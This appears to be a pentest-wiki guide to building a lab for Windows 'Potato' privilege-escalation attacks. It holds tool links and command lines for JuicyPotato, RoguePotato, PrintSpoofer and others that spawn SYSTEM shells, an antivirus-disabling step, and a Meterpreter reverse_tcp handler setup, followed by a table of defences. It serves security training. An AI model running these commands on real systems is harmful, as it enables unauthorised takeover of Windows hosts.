# Potato Attacks Lab Setup (Windows Privilege Escalation)

## Lab Requirements

### Hardware/Software:

- Host OS: Windows or Linux (with virtualization)

- Virtualization: VMware Workstation, VirtualBox, or Hyper-V

- Internet access (to download tools)

- 16+ GB RAM recommended

### VMs:

|Role|OS Version|Purpose|
|---|---|---|
|Windows Victim|Windows 7/8/10 (pre-1809) or Server 2016|Target for Juicy/Rotten/Hot Potato|
|Windows Victim 2|Windows 10 1809+/Server 2019|Target for Rogue/Sweet Potato|
|Kali Linux Attacker|Latest Kali VM|Optional attacker box (nc, smb, metasploit)|

## Tools & Exploits Required

|Tool|Description|Link|
|---|---|---|
|JuicyPotato|COM-based privilege escalation|[GitHub](https://github.com/ohpe/juicy-potato)|
|RoguePotato|Modern token exploit (post-1809)|[GitHub](https://github.com/antonioCoco/RoguePotato)|
|PrintSpoofer|Spooler abuse|[GitHub](https://github.com/itm4n/PrintSpoofer)|
|SweetPotato|Print API COM trick|[GitHub](https://github.com/CCob/SweetPotato)|
|RottenPotatoNG|DCOM-based|[GitHub](https://github.com/decoder-it/RottenPotatoNG)|
|Hot Potato|NBNS+NTLM Relay|[PentestLab](https://pentestlab.blog/2017/04/13/hot-potato/)|
|Tokenvator|Token abuse framework|[GitHub](https://github.com/hatRiot/tokenvator)|

## Lab Configuration

### 1. Create Windows VM(s)

- Install Windows 7/8/10 or Server 2012/2016 with NTFS format.

- Disable antivirus (temporarily) or allow exclusions.

- Install .NET Framework 3.5+, PowerShell 5+, Visual C++ Redistributables.


### 2. Enable SeImpersonatePrivilege

- Ensure the test user has the `SeImpersonatePrivilege`:

```powershell
whoami /priv
```

> Or use `getprivs` inside a Meterpreter shell.

#### To manually give the privilege:

- `secpol.msc` > Local Policies > User Rights Assignment > `Impersonate a client after authentication`

- Add your low-priv user.


### 3. Install SMB/HTTP Server (Optional)

- Use `Impacket` or `Responder` for Hot Potato testing:

```bash
sudo responder -I eth0
```

## Lab Tasks by Attack Type

### 1. Juicy Potato Lab

- Target: Windows 7/8/10 < 1809  

- User: With `SeImpersonatePrivilege`

Steps:

```cmd
JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -t *
```

- Spawn SYSTEM shell

- Confirm with: `whoami`


### 2. Rogue Potato Lab

- Target: Windows 10 1809+  

- User: With `SeImpersonatePrivilege`

Steps:

```cmd
RoguePotato.exe -e "cmd.exe" -l 9999
```

Check SYSTEM shell access.


### 3. PrintSpoofer Lab

- Target: Any with Print Spooler enabled  

- Steps:

```cmd
PrintSpoofer.exe -i -c cmd
```

### 4. Sweet Potato Lab

- Target: Windows 10 with Print Spooler  

- Steps:

```cmd
SweetPotato.exe -p cmd.exe -t CLSID
```

> You may need to test CLSIDs or refer to the GitHub README for working ones.

### 5. Rotten Potato Lab

- Target: Legacy Windows or vulnerable COM servers  

- Steps:

- Use inside a Meterpreter shell or drop `RottenPotato.exe` and run it.

```cmd
RottenPotato.exe
```

### 6. Hot Potato Lab

- Target: Windows 7/8/Server 2008  

- Setup:

- Run Responder/HTTP server to catch NBNS

- Launch exploit

- Full setup guide:  

[https://pentestlab.blog/2017/04/13/hot-potato/](https://pentestlab.blog/2017/04/13/hot-potato/)


## Folder Structure (Recommended)

```text
Potato-Lab/
├── juicy/
│   └── JuicyPotato.exe
├── rogue/
│   └── RoguePotato.exe
├── printspoofer/
│   └── PrintSpoofer.exe
├── sweet/
│   └── SweetPotato.exe
├── rotten/
│   └── RottenPotatoNG.exe
├── hot/
│   └── HotPotato setup files
└── notes/
    └── privesc-findings.md
```


## Bonus – Meterpreter Shell (Optional)

Use Metasploit for interactive privilege escalation testing.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

Once inside Meterpreter:

```bash
getuid
getprivs
```


## Defending Against Potato Attacks

|Measure|Description|
|---|---|
|Remove `SeImpersonatePrivilege` from low-priv users|Core defense|
|Patch vulnerable COM services|Prevent Juicy/Rotten|
|Disable Print Spooler|Prevent PrintSpoofer/Sweet|
|Use EDR/SIEM alerts for suspicious token duplication or named pipes|Detect attacks|
|Enable Credential Guard / LSASS protections|Additional security|

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — parent hub
- [Juicy Potato](Juicy-Potato.md) — exploit exercised in the lab
- [JuicyPotatoNG](JuicyPotatoNG.md) — exploit exercised in the lab
- [God Potato](God-Potato.md) — exploit exercised in the lab
- [Token Impersonation](Token-Impersonation.md) — underlying technique
